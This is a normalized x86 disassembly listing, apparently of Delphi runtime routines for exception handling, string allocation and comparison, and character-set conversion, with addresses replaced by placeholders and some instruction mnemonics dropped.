jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_40348c
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4034b5
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403520
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_40355c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403570
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403584
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_4035a4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403584
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403608
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403054
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405ee4
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403570
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403520
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403734
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403054
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403520
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405ee4
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_40355c
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402ac4
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4038bc
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4035a4
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4038f4
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403eac
sub_40391c
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405ee4
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403128
call sub_403504
sub_403970
call sub_405ee4
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403128
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4035cc
jmp edx
sub_4039b8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027d0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403b18
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403b40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b86
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403ba0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403be6
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403c40
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405c78
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c64
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405c78
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c8c
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403cb0
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403d0c
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403d3c
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40123c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401204
push eax
call sub_401224
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401204
push eax
call sub_401224
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403dc8
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403cb0
call sub_403d3c
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403b40
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403b18
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405744
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403d0c
push eax
call sub_401254
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403eb8
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026ec
pop eax
sub_403edc
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f0c
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_403f7c
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f50
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026ec
sub_403f7c
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026cc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_403fa8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_403f7c
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403eb8
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028c8
sub_403fd8
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_403ff8
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_404014
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403eb8
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_404504
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403fd8
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_403fd8
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404504
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_403fa8
jmp r-xdata
sub_4040b0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_403fa8
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_4040e0
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404014
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404128
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_403fa8
not ecx
sub_404154
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028c8
pop ebx
retn
mov ecx ebx
sub_404180
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403f0c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_404504
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_404504
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028c8
pop edi
pop esi
pop ebx
retn
sub_4041c4
test edx edx
je r-xdata
mov edx ecx
jmp sub_403f0c
test ecx ecx
je sub_403f0c
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404180
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_403f7c
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028c8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028c8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403f0c
pop edx
pop eax
jmp sub_404180
call sub_403f0c
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_404238
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_403f7c
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_404504
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028c8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403f0c
dec [ edx - 0x8 ]
sub_4042c4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_404384
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_403f7c
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028c8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026ec
sub_4043d8
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403eb8
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_403fa8
jmp r-xdata
pop ebx
retn 0x4
sub_404418
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_404384#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028c8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_404504
mov edi ecx
sub_404460
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404504
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028c8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028c8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_4044bc
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404504
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403eb8
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_403f7c
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40270c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028c8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404568
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_403eb8
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403f7c
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_402b34
sub_4045dc
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404600
test edx edx
je sub_4045c4
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4045c4
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
retn
sub_404624
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4045c4
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_40480c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_403ff8
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_403ff8
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40480c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4046b0
jmp r-xdata
sub_4046b0
test ecx ecx
je sub_4045c4
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402828
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_4046d4
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4046b0
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_40473c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4047c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404730
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
